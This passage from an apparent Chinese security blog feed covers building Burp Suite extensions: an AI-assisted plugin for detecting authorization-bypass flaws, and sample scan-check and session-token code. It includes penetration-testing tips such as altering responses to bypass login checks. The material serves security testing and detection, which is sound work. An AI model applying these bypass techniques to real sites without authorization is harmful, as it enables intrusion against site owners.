      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具开发】Burpsuite 插件开发</title>
      <link href="/2024/10/24/tools/aiassist/"/>
      <url>/2024/10/24/tools/aiassist/</url>
      
        <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/ypCkaJ51kcJBQ1cskDuCsA">https://mp.weixin.qq.com/s/ypCkaJ51kcJBQ1cskDuCsA</a></p><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>出发点是在有很多的逻辑漏洞需要我们手动去测试，比如越权漏洞，需要我们修改参数并重放，对比返回数据包的差异，这些简单重复的工作完全可以自动化完成。除此之外还可以自动化实现的漏洞包括：</p><ul><li>信息泄漏：敏感信息数据可以利用ai识别</li><li>验证码回显漏洞：在某些登陆或需要验证的场景下，后端会将验证码返回到前端，前端输入任意账号即可实现登陆或其它敏感操作</li><li>安全机制绕过漏洞：常见于返回包中，返回包修改为：200后，即可绕过后端的登陆失败等问题</li><li>任意用户伪造：需要多个数据包协同，一个数据包修改请求带有用户名，如果可以直接获取到返回的cookie就可以使用这个cookie访问其他的页面</li></ul><h2 id="自动化越权漏洞判断"><a href="#自动化越权漏洞判断" class="headerlink" title="自动化越权漏洞判断"></a>自动化越权漏洞判断</h2><p><a href="https://cloud.tencent.com/developer/article/2235686">https://cloud.tencent.com/developer/article/2235686</a></p><p>从手工测试角度触发主要是有两步</p><ol><li>修改请求包<ul><li>需要明确请求包具体修改哪里，修改的数据类型是什么</li><li>请求包是否有鉴权字段，这个字段哪里来的</li></ul></li><li>判断返回包<ul><li>返回包不能仅仅判断是否相同，因为每次请求可能不一样，应当判断返回包的详细度，或者可以通过关键user相关信息判断</li></ul></li></ol><h3 id="现有工具"><a href="#现有工具" class="headerlink" title="现有工具"></a>现有工具</h3><p><a href="https://github.com/Quitten/Autorize">https://github.com/Quitten/Autorize</a><br><a href="https://github.com/sule01u/AutorizePro">https://github.com/sule01u/AutorizePro</a></p><ol><li><strong>工具标志忽略</strong>（<code>tool_needs_to_be_ignored</code>）：<ul><li>检查是否应忽略来自特定Burp Suite工具（如Spider, Proxy, Target）的请求，基于用户配置。</li></ul></li><li><strong>捕获和记录Cookie和授权头</strong>（<code>capture_last_cookie_header</code>, <code>capture_last_authorization_header</code>）：<ul><li>从HTTP请求或响应中捕获最后一次使用的Cookie和授权头，方便后续请求的复用。</li></ul></li><li><strong>304状态码防御</strong>（<code>handle_304_status_code_prevention</code>）：<ul><li>修改请求头以避免服务器返回304状态码，这可能影响对响应内容的检测。</li></ul></li><li><strong>消息过滤</strong>（<code>message_passed_interception_filters</code>）：<ul><li>应用一系列自定义过滤规则，确定是否应处理特定的HTTP请求或响应。这包括URL包含&#x2F;不包含特定文本或正则表达式、请求体和响应体的内容检测等。</li></ul></li><li><strong>越权检测和授权校验</strong>（<code>handle_message</code>, <code>checkAuthorization</code>, <code>send_request_to_autorize</code>）：<ul><li>主要逻辑入口，处理传入的消息，判断是否符合处理条件，然后执行越权检测。</li><li><code>send_request_to_autorize</code> 是在原始请求基础上修改后发送的功能，用来模拟未授权或重新授权的请求。</li></ul></li><li><strong>自定义逻辑处理响应</strong>（<code>auth_enforced_via_enforcement_detectors</code>, <code>is_json_response</code>, <code>checkBypass</code>）：<ul><li>根据设置的检测逻辑（状态码、头部、响应体等）来确定是否实施了授权。</li><li><code>checkBypass</code> 方法比较授权前后的状态码和内容，以确定是否存在越权或授权绕过。</li></ul></li></ol><p>越权漏洞的检测依赖于比较修改前后的请求响应。如果修改用户授权信息（如Cookie或Authorization header）后，得到的响应与原响应相似，说明系统未能正确实施访问控制，从而存在越权问题。</p><h3 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h3><p>设计一个Burp Suite插件以使用AI进行越权检测并预留扩展性用于未来增加更多逻辑漏洞检测，需要有一个清晰且模块化的架构。以下是一个基础的设计方案，包括主要组件和相关文件的建议。</p><p>#为了设计一个基于AI的Burp Suite插件，用于检测越权漏洞，并考虑未来扩展以支持更多类型的逻辑漏洞检测，我们可以按照以下结构来构建项目：</p><ol><li>项目架构设计<br><strong>核心组件：</strong></li></ol><ul><li><strong>AI Model Interface</strong>: 管理与AI模型的交互，如发送请求数据和接收预测结果。</li><li><strong>Scan Check Implementations</strong>: 实现Burp的<code>ScanCheck</code>接口，用于触发和处理AI模型的检测结果。</li><li><strong>HTTP Request Handler</strong>: 处理HTTP请求的收集和修改，用于发送给AI模型进行分析。</li><li><strong>Result Processor</strong>: 处理AI模型返回的数据，生成Burp的审计问题。</li><li><strong>Utility Classes</strong>: 提供辅助功能，如数据格式化、日志记录和错误处理。</li></ul><p><strong>扩展组件：</strong></p><ul><li><strong>Config Management</strong>: 管理插件的配置，如模型服务器的URL、端口等。</li><li><strong>UI Components</strong>: 如果需要，提供用户界面用于配置插件设置或显示检测结果。</li></ul><ol start="2"><li>项目文件和模块</li></ol><p>基于上述架构，项目的文件结构可以如下设计：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BurpAIExtension/</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/</span><br><span class="line">│   │   │   ├── ai/</span><br><span class="line">│   │   │   │   ├── AIDetector.java           // AI模型接口</span><br><span class="line">│   │   │   │   └── AIModelResponse.java      // 封装AI模型的响应</span><br><span class="line">│   │   │   ├── burp/</span><br><span class="line">│   │   │   │   ├── BurpExtender.java         // 主扩展类</span><br><span class="line">│   │   │   │   ├── UnauthorizedAccessScan.java  // 越权检测实现</span><br><span class="line">│   │   │   │   ├── HttpRequestHandler.java  // HTTP请求处理</span><br><span class="line">│   │   │   │   └── ResultProcessor.java     // 结果处理器</span><br><span class="line">│   │   │   ├── config/</span><br><span class="line">│   │   │   │   └── Configuration.java       // 配置管理</span><br><span class="line">│   │   │   └── utils/</span><br><span class="line">│   │   │       ├── Logger.java              // 日志工具</span><br><span class="line">│   │   │       └── Utilities.java           // 常用工具类</span><br><span class="line">│   │   └── resources/</span><br><span class="line">│   │       └── config.properties            // 配置文件</span><br><span class="line">│   └── test/</span><br><span class="line">│       └── java/</span><br><span class="line">├── build.gradle                             // Gradle构建脚本</span><br><span class="line">└── README.md                                // 项目文档</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具开发】Burpsuite 插件开发 2</title>
      <link href="/2024/10/24/tools/burpsuite-plugins2/"/>
      <url>/2024/10/24/tools/burpsuite-plugins2/</url>
      
        <content type="html"><![CDATA[<h2 id="Custom-Scan-Checks-Example-Extension"><a href="#Custom-Scan-Checks-Example-Extension" class="headerlink" title="Custom Scan Checks Example Extension"></a>Custom Scan Checks Example Extension</h2><p>The sample extension demonstrates the following techniques:</p><ul><li>Registering a custom scan check</li><li>Performing passive and active scanning when initiated by the user</li><li>Using the Burp-provided <code>AuditInsertionPoint</code> to construct requests for active scanning using specified payloads</li><li>Using a helper method to search responses for relevant match strings</li><li>Providing an <code>MarkedHttpRequestResponse</code> to highlight relevant portions of requests and responses, </li><li>Synchronously reporting custom scan issues in response to the relevant checks.</li><li>Guiding Burp on when to consolidate duplicated issues at the same URL (e.g., when the user has scanned the same item multiple times).</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Marker;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.AuditResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.ConsolidationAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.ScanCheck;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssue;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.ByteArray.byteArray;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.AuditResult.auditResult;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.ConsolidationAction.KEEP_BOTH;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.ConsolidationAction.KEEP_EXISTING;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Collections.emptyList;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Collections.singletonList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 ScanCheck 接口的 MyScanCheck 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyScanCheck</span> <span class="keyword">implements</span> <span class="title class_">ScanCheck</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GREP_STRING</span> <span class="operator">=</span> <span class="string">&quot;Page generated by:&quot;</span>; <span class="comment">// 用于被动扫描的字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INJ_TEST</span> <span class="operator">=</span> <span class="string">&quot;|&quot;</span>; <span class="comment">// 用于主动扫描的测试注入字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INJ_ERROR</span> <span class="operator">=</span> <span class="string">&quot;Unexpected pipe&quot;</span>; <span class="comment">// 期望在响应中发现的错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api; <span class="comment">// MontoyaApi 实例，用于访问 API 功能</span></span><br><span class="line"></span><br><span class="line">    MyScanCheck(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主动扫描方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AuditResult <span class="title function_">activeAudit</span><span class="params">(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 构建包含测试负载的 HTTP 请求</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">checkRequest</span> <span class="operator">=</span> auditInsertionPoint.buildHttpRequestWithPayload(byteArray(INJ_TEST)).withService(baseRequestResponse.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送请求并获取响应</span></span><br><span class="line">        <span class="type">HttpRequestResponse</span> <span class="variable">checkRequestResponse</span> <span class="operator">=</span> api.http().sendRequest(checkRequest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取响应中的特定错误信息的高亮显示</span></span><br><span class="line">        List&lt;Marker&gt; responseHighlights = getResponseHighlights(checkRequestResponse, INJ_ERROR);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据响应中是否包含期望的错误信息来创建审计问题</span></span><br><span class="line">        List&lt;AuditIssue&gt; auditIssueList = responseHighlights.isEmpty() ? emptyList() : singletonList(</span><br><span class="line">                auditIssue(</span><br><span class="line">                        <span class="string">&quot;Pipe injection&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Submitting a pipe character returned the string: &quot;</span> + INJ_ERROR,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        baseRequestResponse.request().url(),</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        AuditIssueConfidence.CERTAIN,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        checkRequestResponse.withResponseMarkers(responseHighlights)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> auditResult(auditIssueList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 被动扫描方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AuditResult <span class="title function_">passiveAudit</span><span class="params">(HttpRequestResponse baseRequestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在响应中搜索预定义的字符串</span></span><br><span class="line">        List&lt;Marker&gt; responseHighlights = getResponseHighlights(baseRequestResponse, GREP_STRING);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果找到字符串，则创建审计问题</span></span><br><span class="line">        List&lt;AuditIssue&gt; auditIssueList = responseHighlights.isEmpty() ? emptyList() : singletonList(</span><br><span class="line">                auditIssue(</span><br><span class="line">                        <span class="string">&quot;CMS Info Leakage&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;The response contains the string: &quot;</span> + GREP_STRING,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        baseRequestResponse.request().url(),</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        AuditIssueConfidence.CERTAIN,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        baseRequestResponse.withResponseMarkers(responseHighlights)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> auditResult(auditIssueList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 问题合并策略</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ConsolidationAction <span class="title function_">consolidateIssues</span><span class="params">(AuditIssue newIssue, AuditIssue existingIssue)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果问题名称相同，则保留现有问题，否则保留两个问题</span></span><br><span class="line">        <span class="keyword">return</span> existingIssue.name().equals(newIssue.name()) ? KEEP_EXISTING : KEEP_BOTH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 辅助方法，用于获取响应中匹配字符串的高亮显示</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Marker&gt; <span class="title function_">getResponseHighlights</span><span class="params">(HttpRequestResponse requestResponse, String match)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;Marker&gt; highlights = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> requestResponse.response().toString();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt; response.length())</span><br><span class="line">        &#123;</span><br><span class="line">            start = response.indexOf(match, start);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (start == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Marker</span> <span class="variable">marker</span> <span class="operator">=</span> Marker.marker(start, start+match.length());</span><br><span class="line">            highlights.add(marker);</span><br><span class="line"></span><br><span class="line">            start += match.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> highlights;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomScanChecks</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom Scanner checks&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.scanner().registerScanCheck(<span class="keyword">new</span> <span class="title class_">MyScanCheck</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现原来是Pro版本才有scan功能，重新装了Pro版本</p><h2 id="Custom-Session-Tokens-Example-Extension"><a href="#Custom-Session-Tokens-Example-Extension" class="headerlink" title="Custom Session Tokens Example Extension"></a>Custom Session Tokens Example Extension</h2><p>This example demonstrates how you can couple a recorded macro with an extension to automatically gain a session token for a website and use it in later requests that Burp makes.</p><p>The macro mechanism that Burp provides allows you to record the request triggering creation of a session made via the proxy.</p><p>The extension uses the following techniques:</p><ul><li>Registers a <code>SessionHandlingAction</code> handler</li><li>Fetches the list of macro requests and responses</li><li>Extracts the response headers from the last <code>HttprequestResponse</code> item in the list</li><li>Finds the relevant session header (in this example, this header is <code>X-Custom-Session-Id</code>)</li><li>Returns an <code>HttpRequest</code> with an updated session header</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpHeader;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.ActionResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.SessionHandlingAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.SessionHandlingActionData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.sessions.ActionResult.actionResult;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 SessionHandlingAction 接口的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySessionHandlingAction</span> <span class="keyword">implements</span> <span class="title class_">SessionHandlingAction</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Use session token from macro&quot;</span>;  <span class="comment">// 此操作的名称，用于在 Burp Suite 中标识</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ActionResult <span class="title function_">performAction</span><span class="params">(SessionHandlingActionData actionData)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ActionResult</span> <span class="variable">result</span> <span class="operator">=</span> actionResult(actionData.request(), actionData.annotations());</span><br><span class="line"></span><br><span class="line">        List&lt;HttpRequestResponse&gt; macroRequestResponseList = actionData.macroRequestResponses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (macroRequestResponseList.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> result;  <span class="comment">// 如果没有从宏中获取到请求响应，直接返回原始结果</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从最后一个宏响应中提取响应头</span></span><br><span class="line">        List&lt;HttpHeader&gt; headers = macroRequestResponseList.get(macroRequestResponseList.size()-<span class="number">1</span>).response().headers();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找会话头部</span></span><br><span class="line">        <span class="type">HttpHeader</span> <span class="variable">sessionHeader</span> <span class="operator">=</span> findSessionHeader(headers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有找到会话令牌，返回未修改的请求</span></span><br><span class="line">        <span class="keyword">if</span> (sessionHeader == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个更新了会话头部的 HTTP 请求</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">updatedRequest</span> <span class="operator">=</span> actionData.request().withUpdatedHeader(sessionHeader);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> actionResult(updatedRequest, actionData.annotations());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在响应头中查找特定的会话标识符头部</span></span><br><span class="line">    <span class="keyword">private</span> HttpHeader <span class="title function_">findSessionHeader</span><span class="params">(List&lt;HttpHeader&gt; headers)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">HttpHeader</span> <span class="variable">sessionHeader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(HttpHeader header : headers)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 只处理名为 &quot;X-Custom-Session-Id&quot; 的头部</span></span><br><span class="line">            <span class="keyword">if</span> (!header.name().equals(<span class="string">&quot;X-Custom-Session-Id&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取会话令牌</span></span><br><span class="line">            sessionHeader = header;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sessionHeader;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomSessionTokens</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Session token example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.http().registerSessionHandlingAction(<span class="keyword">new</span> <span class="title class_">MySessionHandlingAction</span>());</span><br><span class="line">    &#125;</span><br><span 